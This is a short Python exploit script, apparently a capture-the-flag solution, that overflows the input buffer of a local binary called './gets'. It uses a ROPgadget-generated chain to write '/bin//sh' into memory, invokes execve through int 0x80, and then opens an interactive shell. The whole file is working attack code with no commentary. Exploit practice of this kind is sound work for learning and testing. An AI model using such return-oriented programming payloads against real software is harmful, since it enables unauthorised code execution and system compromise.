#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack
from pwn import process 

r = process("./gets")


# Padding goes here
p = 'A' * (0x10 + 12)

p += pack('<I', 0x0806f19a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b84d6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08054b4b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f19a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b84d6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08054b4b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f19a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049473) # xor eax, eax ; ret
p += pack('<I', 0x08054b4b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080dece1) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806f19a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049473) # xor eax, eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0807ab7f) # inc eax ; ret
p += pack('<I', 0x0806cd95) # int 0x80

r.send(p)
r.interactive()